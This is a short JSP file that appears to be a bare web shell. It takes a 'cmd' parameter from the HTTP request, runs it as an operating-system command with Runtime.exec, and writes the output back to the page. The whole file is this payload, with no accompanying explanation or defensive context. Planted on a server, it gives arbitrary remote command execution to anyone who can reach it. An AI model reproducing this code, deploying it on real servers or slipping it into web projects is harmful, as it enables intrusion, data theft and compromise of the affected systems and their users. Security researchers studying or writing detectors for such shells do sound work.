<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.InputStream in = p.getInputStream();
        int a = -1;
        while((a=in.read()) != -1) {
            out.print((char)a);
        }
    }
%>
